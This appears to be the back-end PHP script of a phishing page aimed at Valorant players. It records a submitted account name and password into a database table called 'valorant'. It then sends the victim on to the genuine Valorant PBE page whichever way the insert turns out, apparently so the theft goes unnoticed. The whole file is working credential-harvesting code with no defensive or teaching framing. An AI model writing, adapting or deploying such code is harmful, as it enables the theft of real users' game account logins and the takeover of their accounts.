<?php

include 'baglan.php';




if(isset($_POST['butos'])){
    $kaydet=$db->prepare("INSERT INTO valorant SET
    valorant_ad=:ad, 
    valorant_sifre=:sifre");
    $insert=$kaydet->execute(array(
     'ad' => $_POST['valorant_ad'],
     'sifre' => $_POST['valorant_sifre'],
     ));

}
if ($insert) {
header("Location:https://playvalorant.com/tr-tr/pbe/");
}else{
    header("Location:https://playvalorant.com/tr-tr/pbe/");

}

?>